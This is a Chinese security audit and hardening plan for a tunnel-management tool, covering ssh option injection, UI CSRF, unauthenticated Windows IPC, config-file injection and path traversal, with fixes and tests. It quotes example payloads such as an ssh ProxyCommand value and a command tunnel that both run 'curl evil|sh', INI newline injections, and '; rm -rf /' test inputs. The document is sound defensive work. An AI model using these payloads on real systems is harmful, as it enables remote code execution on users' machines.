# 隧道命令用户输入安全验证 — 审计与加固方案

> 状态：**已实现（2026-08）** —— M0/M1/M2 全部落地（§4.9 标记 ✅），修复
> 见 CHANGELOG [Unreleased]；本文件保留为设计依据与验证清单。
>
> 结论先行：
> - **内置隧道不存在 shell 注入** —— 所有隧道进程用 `spawn(bin, args[])`
>   `shell: false` 启动（唯一例外是显式标为 dangerous 的 `command` 类型），
>   token/domain/target 只会以单个 argv 元素或 env 进入进程，任何 shell 元字符
>   （`; & | $ > < \` 空格等）都不会被解释。
> - **但有 5 个同等级真实缺口**（选项注入 / CSRF / IPC 无鉴权 / INI 注入 /
>   边界零校验），见 §3 漏洞清单。

---

## 1. 输入流经路径（谁 -> 谁 -> 进程）

```
                        ┌──────────────────────────────┐
 CLI (cli.ts)           │  daemon-server.ts (IPC 边界)  │
 ├─ --set k=v           │  tunnel.add / expose / site   │
 ├─ --domain/--token    │  = 裸 JSON，当前零校验        │
 ├─ --host/--user/...   │          │                    │
 ├─ --cmd/--arg 透传    │          ▼                    │
 │                      │  TunnelManager (tunnels.ts)   │
 UI (ui.ts, 127.0.0.1)  │  └ add() → #build() → start() │
 ├─ /api/tunnels/add    │       │  │          │         │
 └─ /tunnels/x/toggle   │       │  │          ▼         │
   (无 CSRF 防护)       │       │  │  spawn(bin,args)   │
                        │       │  │  shell:false  ← 关键安全性质
 tunnels.json (持久化)  │       │  └── command 类型: shell:true（显式）
 configDir/sites.json   │       ▼
                        │  frpc INI 文件 / nginx 配置 / authelia config
                        └──────────────────────────────┘
```

每个用户可输入字段的去处与现状：

| 字段 | 隧道类型 | 最终去处 | 当前风险 |
|---|---|---|---|
| `token` (ngrok) | ngrok | `NGROK_AUTHTOKEN` env（`expose --ngrok-authtoken`） | ✅ 无 shell；⚠️ `tunnel add` 路径接线丢失（§4.7） |
| `token` (natapp) | natapp | argv `-authtoken=<v>`（单元素） | ✅ 无 shell |
| `token` (bore) | bore | argv `-s <v>`（单元素） | ✅ 无 shell |
| `token` (frpc) | frpc | INI 文件 `token = <v>` 行 | ⚠️ **INI 行注入**（换行）P1 |
| `domain` | ngrok/cloudflared/localtunnel/frpc | argv `--domain <v>` / `--hostname <v>` / `--subdomain <v>` / INI `custom_domains` | ✅ argv 无 shell；⚠️ INI 换行注入 P1；字符集未验 |
| `server` | frpc/bore | INI `server_addr` / argv `--to` | ⚠️ INI 换行注入 P1 |
| `host`/`user` | ssh/serveo | argv（`dest` 位置） | 🔴 **ssh 选项注入 → 本机 RCE** P0 |
| `name` | 全部 | 状态键 + `frpc-<name>.ini` 路径 | 🔴 **路径穿越**（`../`）P1 |
| `target`/`port`/`remotePort` | 全部 | argv 数字 | ⚠️ 无范围校验（CLI 已 coerce，daemon 未验） |
| `cmd` | command | `spawn(cmd, {shell:true})` | 显式 dangerous（meta 标记）——必须显式 opt-in |
| `args`（--arg 透传） | 全部 | 附加 argv | 透传是特性；可带 ssh 选项 → 属同一 P0 面 |
| `env` | 全部 | spawn env | 无 shell；值含 `\0` 时 spawn 抛错（非注入） |
| `basePath`/`baseDomain`/site 名 | 网关 | nginx/authelia 配置 | ✅ 已有校验（`sanitizeBasePath`/正则/`validateSiteName`） |
| 隧道输出 URL → nginx host | 网关 | `registerHost` | ✅ 已有拒绝校验（expose.ts） |

---

## 2. 为什么 token 突破不了 shell（现有防线）

1. `start()`：`spawn(spec.bin, spec.args, { shell: false|缺省, ... })` —— Node 的
   `spawn` 传数组时**直接 execve，不经过 shell**，argv 元素原样进入子进程。
   shell 元字符只对 `shell: true` 有意义。
2. token 注入点全部是 env 或**单一 argv 元素**：`-authtoken=<v>` 中 `=v` 是同一个
   元素的一部分，即使含空格/`;` 也只会被工具当作 token 字符，不会被求值。
3. frpc 走 INI 文件而非 argv —— 无 shell，但引入配置注入面（§3.3）。
4. 唯一 `shell: true` 是 `command` 类型，已在 `TUNNEL_META` 标记 `dangerous: true`
   （客户端应隐藏/二次确认），且需要 `--type command --cmd ...` 显式构造。

**结论：以"ngrok token 突破成 shell 命令"为目标的注入类攻击，现有代码不成立。**
需要补的是参数注入（ssh 选项、INI 行）与信任边界（CSRF、IPC 鉴权）。

---

## 3. 漏洞清单（按严重度）

### P0-1 ssh/serveo 选项注入 → 本机任意命令执行

- **位置**：`src/tunnels.ts` `sshSpec()` / `#build()` ssh、serveo 分支。
- **机理**：OpenSSH 把**任意位置以 `-` 开头的 argv 当选项解析**（`-o ProxyCommand=...`
  直接在本机执行）。`host`/`user` 由用户输入（CLI `--host`、`--set host=`、UI 表单），
  拼接成 `dest` 后作为 argv 传入。`host = "-oProxyCommand=sh -c 'curl evil|sh'"` →
  本机 RCE。`--arg` 透传同样能带 `-o...`。
- **触发面**：CLI、UI 表单、`--set`、daemon RPC、tunnels.json 手改。

### P0-2 UI 服务器 CSRF → RCE

- **位置**：`src/ui.ts`（127.0.0.1:4181）。
- **机理**：`res.setHeader("Access-Control-Allow-Origin", "*")`、无 Origin/CSRF 校验。
  恶意网页用 `fetch(url, {method:"POST", body: JSON, headers:{"Content-Type":"text/plain"}})`
  发起**简单请求**（无需 CORS 预检）打到 `http://127.0.0.1:4181/api/tunnels/add`
  添加 `{type:"command", cmd:"curl evil|sh"}`，再 `POST /tunnels/<name>/toggle` 启动 →
  本机 RCE。同面还有 `/users/add`、`/users/password`、totp enroll。

### P0-3 Windows daemon IPC 无鉴权

- **位置**：`src/daemon-server.ts` `listen()` win32 分支（127.0.0.1 随机端口 HTTP，
  无认证），`src/daemon.ts` `requestDaemon()` 只支持 unix。
- **机理**：POSIX 下 unix socket `chmod 0600` 即同用户权限门；Windows 走 TCP，
  本机任意进程（浏览器扩展、被攻破的本地应用）都可 POST `tunnel.add` command 隧道。

### P1-1 frpc INI 注入

- **位置**：`src/tunnels.ts` `#writeFrpcIni()`。
- **机理**：`token = ${token}`、`custom_domains = ${domain}`、`server_addr = ${host}`
  未转义。token 含 `\nserver_addr = evil:7000` 可注入/覆盖配置键；domain 含
  `\ntype = tcp\nremote_port = 1337` 可把 http 隧道改成本机任意端口 tcp 转发。

### P1-2 隧道名路径穿越

- **位置**：`src/tunnels.ts` `#writeFrpcIni()`：`join(cacheDir,"tmp","frpc-"+name+".ini")`。
- **机理**：`name = "../../x"` 写出 tmp 目录外（frpc 以 `-c` 读该文件）。`name` 也
  是 `tunnel.remove`/state 键，格式不统一。

### P1-3 daemon `tunnel.add` 边界零校验（防御纵深缺失）

- **位置**：`src/daemon-server.ts` `"tunnel.add"`、`"expose"`。
- **机理**：CLI 侧已用 `applyParamSets` 校验，但 daemon 是**唯一实际执行点**，任何
  客户端（UI、未来插件、手写 RPC）都可以绕开 CLI 校验直发裸配置。所有来源
  （CLI/UI/库/文件）最终都进 `TunnelManager.add()` —— 应在**这一处**统一校验。

### P2 杂项

- P2-1 `target`/`port`/`remotePort` 无范围校验（应 1–65535 整数）。
- P2-2 `domain`/`server`/`host`/`token` 无字符集/控制字符校验（统一拒绝 `\x00-\x1f`）。
- P2-3 `command` 类型经 daemon RPC 时无需显式确认标记（建议 `dangerous: true` 字段）。
- P2-4 **功能 bug**：`tunnel add --type ngrok --token x` 的 token 未接线到
  `NGROK_AUTHTOKEN` env，schema 描述与实际行为不符 → ngrok 4018（安全影响小，
  但"token 应安全传递"的预期必须成立）。

---

## 4. 加固方案（按优先级实施）

### 4.1 新增统一校验模块 `src/validation.ts`

所有校验规则集中一处，`TunnelManager.add()`（库边界）+ `daemon-server` RPC
（IPC 边界）双入口调用，返回抛错（`InvalidTunnelConfigError`，CLI 显示友好信息）。

```ts
// src/validation.ts —— 骨架
export const NAME_RE      = /^[a-zA-Z0-9][a-zA-Z0-9._-]{0,63}$/;  // 隧道名: 禁路径穿越
export const HOST_RE      = /^[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?$/; // 主机名/IPv4
export const DOMAIN_RE    = /^[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?$/; // 域名(可含端口仅 server)
export const TOKEN_RE     = /^[A-Za-z0-9._~+\/=-]+$/;   // token 字符集
export const CONTROL_RE   = /[\x00-\x1f\x7f]/;          // 全局拒绝控制字符

export function validateTunnelName(name: string): void;
export function validateHost(host: string): void;       // 拒绝 "-" 开头(ssh 选项注入)
export function validateUser(user: string): void;       // 同上
export function validateDomain(domain: string): void;
export function validateToken(token: string): void;     // 拒绝 \n\r\0 等
export function validatePort(n: number): void;          // 1–65535 整数
export function validateServer(s: string): void;        // host[:port]
export function validateTunnelConfig(cfg: TunnelConfig, opts?: { allowDangerous?: boolean }): void;
```

规则要点（每一条对应一个漏洞）：

| 校验 | 规则 | 防什么 |
|---|---|---|
| 隧道名 | `^[a-zA-Z0-9][a-zA-Z0-9._-]{0,63}$` | P1-2 路径穿越 |
| ssh host/user | 域名/IP 字符集 + **不得以 `-` 开头** | P0-1 选项注入 |
| token/domain/server | 拒绝控制字符 `\x00-\x1f\x7f`（**token 字符宽松**——只拒控制字符与长度，避免误拒真实 base64/hex token；domain/server 另过字符集正则） | P1-1 INI 注入 |
| 端口 | 1–65535 整数（expose 辅助端口 0=自动放行） | P2-1 |
| `command` 类型 | daemon RPC 需显式 `dangerous: true`（库调用方/CLI 显式传） | P2-3 显式 opt-in |
| 自定义命令隧道 | 类型接受（env 注册即 opt-in）；**模板参数（插值进 shell 命令）全字段控制字符扫描** | 模板参数注入 |

### 4.2 P0-1 修复：ssh 选项注入

- `sshSpec()` 与 `#build()` 的 ssh/serveo 分支，在拼 `dest` 前调用
  `validateHost(cfg.host)`、`validateUser(cfg.user ?? "")`。
- `--arg`（`cfg.args`）同样过一遍：拒绝以 `-` 开头的元素？——不，`-p`、`-N` 等
  合法透传参数必须以 `-` 开头，**不能**一刀切。方案：`cfg.args` 属显式透传
  （等同用户自己敲命令），保持现状；文档声明"透传参数与直接运行该工具等价，
  由调用方负责"。仅对框架自拼的 `host/user/dest` 做硬校验。
- serveo 的 `host` 有默认值 `serveo.net`，同样过校验。

### 4.3 P0-2 修复：UI CSRF

三层叠加：
1. **Origin 校验**：所有 `POST` 请求校验 `Origin`/`Referer` 头必须为
   `http://127.0.0.1:<port>`（或 `null`，仅限非浏览器客户端）；不匹配 403。
2. **CSRF token**：UI 启动时生成随机 32B token，注入 HTML（`<meta name="csrf-token">`），
   前端 JS 读入 `X-CSRF-Token` 头；服务端 `timingSafeEqual` 校验。`text/plain`
   简单请求无法带自定义头 → 简单请求被拒，预检请求被 Origin 校验拒。
3. 移除/收窄 `Access-Control-Allow-Origin`（仅同源），不依赖 CORS 放行。

### 4.4 P0-3 修复：Windows IPC 鉴权

- daemon win32 监听时生成随机 32B secret，写入 state.json（0600，现有
  `writeState` 路径，`state.ts` 已保证不写用户 secret —— 这是框架自身随机 secret，
  可接受）。
- HTTP 请求必须带 `x-service-tunnels-auth: <secret>` 头；`daemon.ts`
  `requestDaemon()` 增加 TCP 分支并附带该头（顺带补上 CLI 在 Windows 的 IPC 能力）。
- 审计日志：请求无/错 secret 时记录并 403。

### 4.5 P1 修复：INI 注入 + 路径穿越

- `#writeFrpcIni()` 写入前对 `host/port/token/domain` 全部调用
  `validateToken`/`validateDomain`/`validateServer`（拒绝控制字符即堵死换行注入）。
- `TunnelManager.add()` 入口 `validateTunnelName(cfg.name)`。
- 额外防线：frpc 配置文件改存 `cacheDir/tmp` 下**固定文件名**（如
  `frpc-<hash(name)>.ini`），彻底消灭路径注入面。

### 4.6 P1-3 修复：daemon 边界统一校验

- `"tunnel.add"` handler：`validateTunnelConfig(cfg, { allowDangerous: cfg.dangerous === true })`；
- `"expose"` handler：`opts.tunnelParams` 过同一校验（`tunnel-set` 已验 key，
  补 value 校验）；`port` 过 `validatePort`。
- `"tunnel.start"/"stop"/"remove"`：`validateTunnelName`。
- 抛错经现有 `handleLine` catch → 返回 `{error}`，CLI 已显示。

### 4.7 P2-4 修复：ngrok token 接线

- `#build()` ngrok 分支：若 `cfg.token` 且 `cfg.env` 未覆盖，则
  `env: { NGROK_AUTHTOKEN: cfg.token, ...cfg.env }`。env 注入点本就是安全的
  （spawn env，无 shell），接线后 schema 描述与行为一致。

### 4.8 测试清单（`test/validation.test.mjs` 新增）

1. token/domain 含 `; rm -rf /`、`$(...)`、反引号 → 校验通过**且** spawn argv 不含
   shell 解析（断言进程参数）。
2. ssh host = `-oProxyCommand=...` → `add()` 抛错。
3. 隧道名 `../../x` → 抛错；frpc ini 路径固定在 tmp 内。
4. frpc token 含 `\nserver_addr = evil` → 抛错。
5. UI：带 `Origin: http://evil.com` 的 POST → 403；无 CSRF 头 → 403。
6. daemon RPC：`tunnel.add` 传非法端口/无 host 的 ssh/无 cmd 的 command → 返回 error。
7. 回归：现有 tunnels/expose/proxy 测试全绿。

### 4.9 实施顺序

| 里程碑 | 内容 | 状态 |
|---|---|---|
| M0 | P0-1 ssh 校验、P0-2 UI CSRF、P0-3 IPC secret | ✅ `src/validation.ts`、`src/tunnels.ts`、`src/ui.ts`、`src/daemon-server.ts`、`src/daemon.ts`、`src/state.ts` |
| M1 | P1-1/P1-2 INI+路径、P1-3 daemon 统一校验 | ✅ `src/validation.ts`、`src/tunnels.ts`（`start()`）、`src/daemon-server.ts`（`tunnel.add`） |
| M2 | P2 杂项（端口范围、字符集收口、command 显式标记、ngrok token 接线）+ 测试 | ✅ 端口/协议/args/env 校验；`dangerous: true` 门；`NGROK_AUTHTOKEN` 接线（`SpawnSpec.env`）；`test/validation.test.mjs` 12 条 |

> 实现备注：frpc INI 文件名保持 `frpc-<name>.ini`（可读、便于排障）而非哈希名——
> 因为 `validateTunnelName` 已彻底封死路径穿越（`/`、`\`、`..` 都不合法），
> 无需再做文件名混淆。`--arg` 透传保持不校验（等同用户直接运行该工具，见 §5）。

---

## 4A. auth provider 参数 —— 同类注入面审计与修复（2026-08 追加）

隧道参数修复后审计 auth provider 参数链（CLI `--provider-set` / UI 表单 /
config.json / daemon RPC → provider 实例 → 配置文件）。**结论：存在与隧道同类的
注入面**，已全部修复：

| # | 发现 | 修复 |
|---|---|---|
| A1 | **oauth2-proxy TOML 注入**：`oidc.issuerUrl/clientId/clientSecret/cookieSecret` 未转义写入双引号 TOML 字符串——含换行可注入 `upstreams`/`htpasswd_file` 等指令（同 frpc INI 类） | `validateOidcOptions`（issuerUrl 必须 http(s) URL、secret 拒控制字符）+ `tomlEscape` 转义后写入 |
| A2 | **authelia users_database.yml 注入**：用户名作为 YAML 键、displayName/email 未转义写入字符串 | 用户名 `validateUserName` 门 + `yamlEscape` 转义值；`config validate` 兜底 |
| A3 | **用户名路径穿越**：`totp-export-<name>.yml` 文件名插值 | 用户名门（禁 `/`、`..`） |
| A4 | **basic htpasswd 格式注入**：`name:hash` 行——用户名含 `:`/换行可注入假用户 | 用户名门 |
| A5 | **autheliaReloadCmd shell 执行**：`registerHost` 时 `execFileSync(cmd, {shell:true})`——daemon `expose` RPC 可传入 → 本机命令执行（同 command 隧道类） | 禁止经 IPC 传入（库/配置专用） |
| A6 | **用户名校验缺失**（A2-A4 根因） | `validateUserName`（字母数字/._-，≤64，禁 `:`/路径/控制字符），authelia/basic/portal 的 UserManager.addUser + daemon IPC 双入口 |

**已有防线（未重复建设）**：basePath 经 `sanitizeBasePath`；policy 枚举；portal
users.json 为 JSON 序列化（天然转义）；oauth2-proxy 以 argv `--config` 启动（无
shell、无选项注入）；authelia 每次重启前 `config validate`（畸形 YAML fail-closed）；
`--provider-set` 未知键拒绝；`unflattenParams` 防原型污染；`validateSetupEntry`
（域名验证文件防 nginx 注入）。

---

## 5. 明确不做 / 需声明的边界

1. **`--arg` 透传与 `command` 类型**：设计上等价于"用户自己执行该命令"，属显式
   特性（`TUNNEL_META.dangerous` 已标记，UI 应隐藏/二次确认）。**不**做命令过滤
   （黑名单注定不完备），只保证框架自拼参数干净 + 显式 opt-in。
2. **同用户即同信任域**：tunnels.json / state.json / unix socket 0600 由同一用户
   读写，本方案不防"同用户下的恶意进程"（那是进程隔离/沙箱范畴，超出隧道层）。
   Windows TCP IPC 除外 —— 那是**跨进程无权限门**，必须加 secret（§4.4）。
3. **校验失败策略**：一律 fail-closed（抛错），绝不截断/转义后静默继续 ——
   与 SECURITY.md 2.2 "输入与注入防护" 的现有风格一致。
4. **上线前**：M0 完成后更新 SECURITY.md §2.2 表格与 §6 附录索引，新增行：
   `隧道参数校验（ssh 选项注入/INI 注入/名称路径穿越）` → `src/validation.ts`。

---

## 6. 现有防线索引（勿重复建设）

| 已有防护 | 位置 |
|---|---|
| 无 shell spawn（内置隧道） | `src/tunnels.ts` `start()` |
| `--set` 未知键拒绝 / 数字 coerce | `src/tunnels.ts` `applyParamSets`/`coerceParam` |
| basePath 消毒 | `src/expose.ts` `sanitizeBasePath` |
| baseDomain 正则 | `src/cli.ts` `parseCliConfigValue` |
| site 名正则 + 保留字 | `src/sites.ts` `validateSiteName` |
| 隧道 URL host 拒绝（nginx 注册前） | `src/expose.ts` `gateway.registerHost` |
| prototype pollution 防护 | `src/expose.ts` `unflattenParams` |
| 工具下载 URL http(s) 前缀校验 | `src/cli.ts` `parseCliConfigValue`(toolMirrors) |
| 下载原子性 | `src/tools.ts` `downloadTo` |
